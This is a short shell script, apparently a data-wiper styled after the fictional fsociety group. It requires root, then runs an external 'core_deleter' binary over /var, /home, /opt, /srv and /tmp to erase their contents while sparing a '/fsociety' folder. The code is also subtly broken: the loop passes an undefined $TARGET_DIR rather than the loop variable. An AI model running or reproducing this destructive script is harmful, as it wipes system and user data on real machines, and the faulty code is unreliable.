#!/usr/bin/sh

if [ "$EUID" -ne 0 ]; then
  echo "[!] Permission denied: required root privilege."
  exit 1
fi

TARGET_DIRS="/var /home /opt /srv /tmp"
EXCLUDE_DIR="/fsociety"
DELETER_BIN="./tools/core_deleter"

if [ ! -f "$DELETER_BIN" ]; then
  echo "[!] Error: Couldn't find ($DELETER_BIN)!"
  exit 1
fi

for DIR in $TARGET_DIRS; do
  if [ -d "$DIR" ]; then
    echo "[*] Unlinking Inodes in $DIR..."
    "$DELETER_BIN" "$TARGET_DIR" "$EXCLUDE_DIR"
  fi
done

echo "[+] Inodes gone!"
